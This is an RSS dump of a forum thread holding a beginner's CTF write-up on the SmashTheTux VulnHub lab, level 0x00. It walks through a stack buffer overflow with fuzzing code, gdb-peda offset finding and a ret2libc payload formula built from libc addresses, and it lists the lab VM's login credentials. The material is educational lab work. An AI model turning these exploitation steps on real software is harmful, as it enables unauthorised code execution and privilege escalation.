+tux@tux:/home/tux/0x00$ 
+```
+Horraaayyy! :partying_face::partying_face::partying_face:
+
+I will discuss Level 0x01 in the next series of SmashTheTux. Feedback are welcome &lt;3. See ya!
+
+Reference:
+
+- https://cwe.mitre.org/data/definitions/120.html
+- https://www.freebsd.org/cgi/man.cgi?query=strlcpy&amp;sektion=3
+- https://github.com/ebtaleb/peda_cheatsheet/blob/master/peda.md
+- https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html
+- https://www.shellblade.net/docs/ret2libc.pdf
+- https://decoder.cloud/2017/06/15/simple-aslrnx-bypass-on-a-linux-32-bit-binary/
+- https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/
+- https://reboare.github.io/bof/linux-stack-bof-3.html
+- https://www.coengoedegebure.com/buffer-overflow-attacks-explained/</description>
+    
+    <lastBuildDate>Fri, 12 Jul 2019 11:38:35 +0000</lastBuildDate>
+    <category>Exploit Development</category>
+    <atom:link href="https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+          <p><a href="https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850/5</link>
+        <pubDate>Thu, 08 Aug 2019 09:57:51 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-14850-5</guid>
+        <source url="https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850.rss">[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</source>
+      </item>
+      <item>
+        <title>[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</title>
+        <dc:creator><![CDATA[petruknisme]]></dc:creator>
+        <description><![CDATA[
+            <p>Hi <a class="mention" href="https://d.clarkee.co.uk/u/nekiruy">@Nekiruy</a>,</p>
+<p>As far as I know, the stack address which initially contained with EIP will be overwritten and contains an address to the <code>system()</code> when <code>system()</code> is executing.</p>
+<p>For more information about ret2libc, you can look at <a class="mention" href="https://d.clarkee.co.uk/u/ioth1nkn0t">@IoTh1nkN0t</a> explanation <a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833">Exploiting Techniques \000 - ret2libc </a></p>
+          <p><a href="https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850/4</link>
+        <pubDate>Fri, 12 Jul 2019 11:37:46 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-14850-4</guid>
+        <source url="https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850.rss">[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</source>
+      </item>
+      <item>
+        <title>[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</title>
+        <dc:creator><![CDATA[Nekiruy]]></dc:creator>
+        <description><![CDATA[
+            <p>Thanks for the writeup, nice and methodical.</p>
+<p>Can clarify something for me tho, when building the exploit, you construct it as follows</p>
+<pre><code class="lang-auto">Bytes Offset + System Address + Exit Address + Shell Address
+</code></pre>
+<p>Is that because the EIP is overwritten with System() address and will jump into the System call, which expects the first item on the stack as its parameter (in this case the Shell Address, as its the second item to be pushed on by your exploit code, so the first to be popped by system()) then the ESP from the system function’s perspective is pointing to Exit() to leave the application when you return from the system call.</p>
+          <p><a href="https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850/2</link>
+        <pubDate>Thu, 11 Jul 2019 14:06:46 +0000</pubDate>
+        <guid isPermaLink="false">d.clarkee.co.uk-post-14850-2</guid>
+        <source url="https://d.clarkee.co.uk/t/vulnhub-smashthetux-chapter-0x00-basic-buffer-overflow-ret2libc/14850.rss">[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</source>
+      </item>
+      <item>
+        <title>[VulnHub] SmashTheTux - Chapter 0x00 - Basic Buffer Overflow &amp; Ret2libc</title>
+        <dc:creator><![CDATA[petruknisme]]></dc:creator>
+        <description><![CDATA[
+            <p>SmasTheTux is Vulnerable VM hosted by <a href="https://vulnhub.com" rel="noopener nofollow ugc">VulnHub</a> and created by <a href="https://canyoupwn.me/smashthetux-vm/" rel="noopener nofollow ugc">CanYouPwnMe</a></p>
+<h4><a name="p-44170-disclaimer-1" class="anchor" href="https://d.clarkee.co.uk#p-44170-disclaimer-1"></a>Disclaimer</h4>
+<p>This is for educational purpose and I will try to explain this tutorial with beginner-friendly explanation as I can.</p>
+<p>SmashTheTux is a new VM made by <a href="http://canyoupwn.me" rel="noopener nofollow ugc">canyoupwn.me</a> for those who wants to take a step into the world of binary exploitation. This VM consists of 9 challenges, each introducing a different type of vulnerability. SmashTheTux covers basic exploitation of the following weaknesses:</p>
+<ul>
+<li>Stack Overflow Vulnerability</li>
+<li>Off-by-One Vulnerability</li>
+<li>Integer Overflow</li>
+<li>Format String Vulnerability</li>
+<li>Race Conditions</li>
+<li>File Access Weaknesses</li>
+<li>Heap Overflow Vulnerability</li>
+</ul>
+<p>VM Description:</p>
+<pre><code class="lang-auto">Name........: SmashTheTux: 1.0.1
+Date Release: 1 Apr 2016
+Author......: CanYouPwn.Me
+Series......: SmashTheTux
+Objective...: Leveling up from user
+Tester(s)...: h1tch1
+Twitter.....: https://twitter.com/D4rk36
+Credential..: tux:tux,root:1N33dP0w3r
+Filename....: SmashTheTux_v1.0.1.7z
+File size...: 616 MB
+MD5.........: 63FEDA288163D9155B1BF84D1C6C2814
+SHA1........: 01DCB1AB85B139A386AD97B41190731509612F59
+
+</code></pre>
+<p>Download link: <a href="https://www.vulnhub.com/entry/smashthetux-101,138/" class="inline-onebox" rel="noopener nofollow ugc">SmashTheTux: 1.0.1 ~ VulnHub</a></p>
+<p><strong>Summary</strong></p>
+<p>In this first series, I will cover two topic:</p>
+<ul>
+<li>Bypassing NX using ret2libc</li>
+<li>Exploiting with execstack enable</li>
+</ul>
+<h4><a name="p-44170-initial-setup-2" class="anchor" href="https://d.clarkee.co.uk#p-44170-initial-setup-2"></a><strong>Initial Setup</strong></h4>
+<p>Login to SmasTheTux VM using Virtualbox, VMWare or other virtualization clients with the above credentials and then get the IP address from that for easy access:</p>
+<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/2X/f/f43e2a1a62a65e1fb7e4e81899fc8bd388347fcc.png" data-download-href="/uploads/short-url/yQFGKB7w4GU2wfE8tMsD8SABLWI.png?dl=1" title="tux-login" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f43e2a1a62a65e1fb7e4e81899fc8bd388347fcc.png" alt="tux-login" data-base62-sha1="yQFGKB7w4GU2wfE8tMsD8SABLWI" width="690" height="180"></a></div><p></p>
+<h4><a name="p-44170-ssh-3" class="anchor" href="https://d.clarkee.co.uk#p-44170-ssh-3"></a><strong>SSH</strong></h4>
+<p>We will use ssh for remoting the VM because it’s easy to use rather than debugging in the VM without scroll function, copy paste and other function.</p>
+<pre data-code-wrap="bash"><code class="lang-bash">ssh tux@192.168.2.125
+The authenticity of host '192.168.2.125 (192.168.2.125)' can't be established.
+ECDSA key fingerprint is SHA256:f/.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.2.125' (ECDSA) to the list of known hosts.
+                            _    _            _._ 
+                          .|_|_,' |          /_ _`. 
+                          |       |          (.X.)| 
+                          `|`'`-._|          |\_/'| 
+                           | |               )____`\ 
+                           | |              //_V _\ \ 
+                           | |             ((  |  `(_) 
+                           | |            / \&gt; '   / \ 
+                           | |            \  \.__./  / 
+                           | |             `-'    `-' 
+                           | |
+                          |` |
+                          `--'
+         __                     _    _____ _         _____            
+        / _\_ __ ___   __ _ ___| |__/__   \ |__   __/__   \_   ___  __
+        \ \| '_ ` _ \ / _` / __| '_ \ / /\/ '_ \ / _ \/ /\/ | | \ \/ /
+        _\ \ | | | | | (_| \__ \ | | / /  | | | |  __/ /  | |_| |&gt;  &lt; 
+        \__/_| |_| |_|\__,_|___/_| |_\/   |_| |_|\___\/    \__,_/_/\_\
+                                                                      
+                                                by canyoupwn.me
+
+tux@192.168.2.125's password: 
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Mon Jul  8 10:10:30 2019
+tux@tux:~$ 
+
+</code></pre>
+<p>After successful login, we can see a list of files and tutorials for completing these challenges:</p>
+<pre data-code-wrap="bash"><code class="lang-bash">tux@tux:~$ ls -al
+total 288
+drwxr-xr-x 12 tux  tux   4096 Mar 12  2016 .
+drwxr-xr-x  3 root root  4096 Mar 11  2016 ..
+drwxr-xr-x  2 tux  tux   4096 Mar 11  2016 0x00
+drwxr-xr-x  2 tux  tux   4096 Mar 11  2016 0x01
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x02
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x03
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x04
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x05
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x06
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x07
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x08
+drwxr-xr-x  2 tux  tux   4096 Mar 12  2016 0x09
+lrwxrwxrwx  1 tux  tux      9 Mar 11  2016 .bash_history -&gt; /dev/null
+-rw-r--r--  1 tux  tux    220 Mar 11  2016 .bash_logout
+-rw-r--r--  1 tux  tux   3545 Mar 11  2016 .bashrc
+lrwxrwxrwx  1 tux  tux      9 Mar 11  2016 .nano_history -&gt; /dev/null
+-rw-r--r--  1 tux  tux    675 Mar 11  2016 .profile
+-rw-r--r--  1 tux  tux    679 Mar 12  2016 README
+-rw-r--r--  1 tux  tux  20871 Mar 12  2016 TUTORIAL_formatstring
+-rw-r--r--  1 tux  tux  91044 Mar 11  2016 TUTORIAL_heapoverflow
+-rw-r--r--  1 tux  tux  27657 Mar 11  2016 TUTORIAL_integerbugs
+-rw-r--r--  1 tux  tux  18657 Mar 11  2016 TUTORIAL_offbyone
+-rw-r--r--  1 tux  tux  60996 Mar 11  2016 TUTORIAL_stackoverflow
+</code></pre>
+<p>For someone who have experienced with <a href="https://exploit.education/protostar/" rel="noopener nofollow ugc">Protostar</a>, this machine challenges is identical with that.</p>
+<h4><a name="p-44170-level-0x00-4" class="anchor" href="https://d.clarkee.co.uk#p-44170-level-0x00-4"></a><strong>Level 0x00</strong></h4>
+<p>We have binary file with the source code available:</p>
+<pre data-code-wrap="c"><code class="lang-c">// gcc pwnme.c -o pwnme -fno-stack-protector
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void vuln( char * arg ) {
+        char buf[256];
+        strcpy(buf, arg);
+}
+
+int main(int argc, char **argv) {
+        printf("Val: %s\n", argv[1]);
+        vuln(argv[1]);
+
+        return 0;
+}
+</code></pre>
+<p>The above code consist of vulnerable function:</p>
+<ul>
+<li><code>main()</code> function take the input as <code>argv[1]</code> and the pass the value to <code>vuln()</code> function</li>
+<li><code>char buf[256]; </code>define the buf variable with 256 bytes in length.</li>
+<li><code>strcpy(buf, arg);</code> copying buffer from <code>main()</code> to <code>arg</code> variable</li>
+</ul>
+<p>We know that <code>strcpy(3)</code> is a very unsafe function call in the C library and we should use <code>strlcpy(3)</code> or <code>snprintf</code>instead.</p>
+<p>Why? Because by default no check for the size of data that will fit in the local buffer and blindly copies the data.</p>
+<p><strong>Fuzzing</strong></p>
+<p>We know that maximum length is 256 bytes for the user input defined before. We can use little python script for fuzzing the input in case we don’t know the offset address:</p>
+<pre data-code-wrap="python"><code class="lang-python"># tux@tux:~/0x00$ cat fuzz.py
+import os
+
+buffer=["A"]
+counter=100
+
+while len(buffer) &lt;= 30:
+    buffer.append("A" * counter)
+    counter=counter+100
+
+for string in buffer:
+    print("Fuzzing %s bytes" % len(string))
+    os.system("./pwnme %s" % string) 
+</code></pre>
+<p>Explanation:</p>
+<ul>
+<li>Define first buffer as 100 bytes and then increase by 100 bytes per loop</li>
+<li>Copy buffer to program parameter as an argument</li>
+</ul>
+<p>It will show this result:</p>
+<pre data-code-wrap="bash"><code class="lang-bash">tux@tux:~/0x00$ python fuzz.py 
+Fuzzing 1 bytes
+Val: A
+Fuzzing 100 bytes
+Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Fuzzing 200 bytes
+Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Fuzzing 300 bytes
+Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+Fuzzing 400 bytes
+Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+Fuzzing 500 bytes
+Val: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+
+------- long result cut ----------
+</code></pre>
+<p>From the above result, the program starting to crash/segmentation fault when we use 300 bytes as the input parameter. But what number exactly trigger that segfault? How to find the missing one? Let’s use gdb-peda for doing this job. I will prefer gdb-peda instead of gdb for easy to use and more friendly.</p>
+<p><strong>Install Gdb-Peda</strong></p>
+<p>Don’t forget to check if gdb is existed in the machine before using gdb-peda.</p>
+<pre data-code-wrap="bash"><code class="lang-bash">tux@tux:~/0x00$ gdb -v
+GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i586-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+</code></pre>
+<p>Because of a limited package in the remote machine, we need to download gdb-peda in local and then copy to the server using SCP or FTP.</p>
+<pre><code class="lang-auto"># in host machine
+git clone https://github.com/longld/peda.git /home/user/peda
+scp -r /home/user/peda tux@192.168.2.125:/home/tux
+
+# from the tux machine
+echo "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit
+echo "DONE! debug your program with gdb and enjoy"
+</code></pre>
+<p>We can check if peda is successfully installed with just running the gdb and see the result:</p>
+<pre data-code-wrap="bash"><code class="lang-bash">tux@tux:~/0x00$ gdb ./pwnme 
+GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i586-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+Find the GDB manual and other documentation resources online at:
+&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./pwnme...(no debugging symbols found)...done.
+gdb-peda$ 
+</code></pre>
+<p>Nah, we have <code>gdb-peda</code> installed. Let’s do some check for binary security of that file. This is the first thing that I would do when starting Linux binary exploitation:</p>
+<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+</code></pre>
+<p>Hm… NX is enabled. So, what this means is that we can’t execute our payload/shellcode in stack address because of NX(Non-Executable stack) prevention. Since the processor is not allowed to execute instructions placed on the stack.</p>
+<p>In order to bypass this mechanism, We can use <code>ret2lib</code>(return to libc or return to the C library) technique. In the simple definition, this attack doesn’t require any shellcode to take control of the target vulnerable process because we can invoke classic built-in functions such as “system, exit, etc”.</p>
+<p>For more information about ret2libc, you can look at <a class="mention" href="https://d.clarkee.co.uk/u/ioth1nkn0t">@IoTh1nkN0t</a> explanation <a href="https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833" rel="noopener nofollow ugc">https://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833</a></p>
+<p><strong>Finding Patterns</strong></p>
+<p>As we know that our program crash when using 300 bytes as input parameter, this is will be our clue for creating a pattern and finding the right offset with gdb-peda.</p>
+<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ pattern create 300
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
+</code></pre>
+<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
+Starting program: /home/tux/0x00/pwnme 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%'
+Val: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff4b0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
+EBX: 0xbffff5f0 --&gt; 0x2 
+ECX: 0xbffff8e0 ("A%5A%KA%gA%6A%")
+EDX: 0xbffff5ce ("A%5A%KA%gA%6A%")
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0x64254148 ('HA%d')
+ESP: 0xbffff5c0 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+EIP: 0x41332541 ('A%3A')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41332541
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff5c0 ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0004| 0xbffff5c4 ("eA%4A%JA%fA%5A%KA%gA%6A%")
+0008| 0xbffff5c8 ("A%JA%fA%5A%KA%gA%6A%")
+0012| 0xbffff5cc ("%fA%5A%KA%gA%6A%")
+0016| 0xbffff5d0 ("5A%KA%gA%6A%")
+0020| 0xbffff5d4 ("A%gA%6A%")
+0024| 0xbffff5d8 ("%6A%")
+0028| 0xbffff5dc --&gt; 0xb7e3fa00 (&lt;__libc_start_main+144&gt;:       mov    esi,DWORD PTR [eax+0x1d0])
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41332541 i
+</code></pre>
+<p>Aha! We got a signal from our Lord with SIGSEGV(Segmentation Fault). From my experience, this is a possible signal to overflow the buffer. We get the offset at the end of result <code>0x41332541</code>.</p>
+<p>We can check information register for EIP, EBP, ESP:</p>
+<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$  i r eip esp ebp
+eip            0x41332541       0x41332541
+esp            0xbffff5c0       0xbffff5c0
+ebp            0x64254148       0x64254148
+</code></pre>
+<p>What’s next? checking the correct offset address:</p>
+<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ pattern offset 0x41332541
+1093870913 found at offset: 268
+</code></pre>
+<p>Now, this is what we got so far:</p>
+<ul>
+<li>EIP Offset 0x41332541</li>
+<li>Offset Number 268</li>
+<li>NX Enabled.</li>
+</ul>
+<p><strong>Exploiting with NX Enabled</strong></p>
+<p>First, We need to check if ASLR is enabled or not</p>
+<pre><code class="lang-auto">$ cat /proc/sys/kernel/randomize_va_space
+0
+</code></pre>
+<p>Good, ASLR is disabled for this machine. So, it will be easy for us because the address space value is not dynamically changed.</p>
+<pre><code class="lang-auto">tux@tux:~/0x00$ ldd pwnme
+        linux-gate.so.1 (0xb7ffd000)
+        libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e46000)
+        /lib/ld-linux.so.2 (0x80000000)
+tux@tux:~/0x00$ ldd pwnme
+        linux-gate.so.1 (0xb7ffd000)
+        libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e46000)
+        /lib/ld-linux.so.2 (0x80000000)
+tux@tux:~/0x00$ ldd pwnme
+        linux-gate.so.1 (0xb7ffd000)
+        libc.so.6 =&gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0xb7e46000)
+        /lib/ld-linux.so.2 (0x80000000)
+</code></pre>
+<p>As we can see “libc” address is the same every time we check with ldd.</p>
+<p><strong>Finding Functions Address</strong></p>
+<p>For this purpose, We only need <code>system()</code>, <code>/bin/sh</code>, and <code>exit()</code> function. We will use system function and passing a shell as an argument and then invoke the exit function in order to terminate our system call. Start the program first.</p>
+<pre data-code-wrap="bash"><code class="lang-bash">gdb-peda$ start
+[----------------------------------registers-----------------------------------]
+EAX: 0x1 
+EBX: 0xb7fcf000 --&gt; 0x1a8da8 
+ECX: 0xbffff730 --&gt; 0x1 
+EDX: 0xbffff754 --&gt; 0xb7fcf000 --&gt; 0x1a8da8 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbffff718 --&gt; 0x0 
+ESP: 0xbffff710 --&gt; 0xbffff730 --&gt; 0x1 
+EIP: 0x804845a (&lt;main+15&gt;:      mov    ebx,ecx)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048456 &lt;main+11&gt;: mov    ebp,esp
+   0x8048458 &lt;main+13&gt;: push   ebx
+   0x8048459 &lt;main+14&gt;: push   ecx
+=&gt; 0x804845a &lt;main+15&gt;: mov    ebx,ecx
+   0x804845c &lt;main+17&gt;: mov    eax,DWORD PTR [ebx+0x4]
+   0x804845f &lt;main+20&gt;: add    eax,0x4
+   0x8048462 &lt;main+23&gt;: mov    eax,DWORD PTR [eax]
+   0x8048464 &lt;main+25&gt;: sub    esp,0x8
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff710 --&gt; 0xbffff730 --&gt; 0x1 
+0004| 0xbffff714 --&gt; 0xb7fcf000 --&gt; 0x1a8da8 
+0008| 0xbffff718 --&gt; 0x0 
+0012| 0xbffff71c --&gt; 0xb7e3fa63 (&lt;__libc_start_main+243&gt;:       mov    DWORD PTR [esp],eax)
+0016| 0xbffff720 --&gt; 0x80484a0 (&lt;__libc_csu_init&gt;:      push   ebp)
+0020| 0xbffff724 --&gt; 0x0 
+0024| 0xbffff728 --&gt; 0x0 
+0028| 0xbffff72c --&gt; 0xb7e3fa63 (&lt;__libc_start_main+243&gt;:       mov    DWORD PTR [esp],eax)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Temporary breakpoint 1, 0x0804845a in main ()
+</code></pre>
+<p>After that, we can find the address we need.</p>
+<pre><code class="lang-auto">gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xb7f85a69 ("/bin/sh")
+gdb-peda$ p &amp;exit
+$1 = (&lt;text variable, no debug info&gt; *) 0xb7e571b0 &lt;__GI_exit&gt;
+gdb-peda$ p &amp;system
+$2 = (&lt;text variable, no debug info&gt; *) 0xb7e643e0 &lt;__libc_system&gt;
+</code></pre>
+<p>Explanation:</p>
+<ul>
+<li>system() address is 0xb7e643e0</li>
+<li>exit() address is 0xb7e571b0</li>
+<li>/bin/sh address 0xb7f85a69</li>
+</ul>
+<p><strong>Creating Payload</strong></p>
+<p>We can use this formula from the information we gathered before:</p>
+<blockquote>
+<p>Bytes Offset + System Address + Exit Address + Shell Address</p>
+</blockquote>
